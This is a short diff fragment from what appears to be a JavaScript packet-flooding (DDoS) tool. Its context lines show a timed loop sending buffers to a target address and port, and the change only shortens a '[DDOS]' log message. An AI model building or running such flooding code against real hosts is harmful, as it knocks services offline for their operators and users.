@@ -34,6 +34,6 @@ setInterval(() => {
     client.send(buffer ?? '', port, address);
   })
 
-  console.log(`[DDOS] Sending packets to ${address}:${port}...`)
+  console.log(`[DDOS] ${address} ${port}`)
 }, (1000 / (times <= 0 ? 1000 : times)))
 
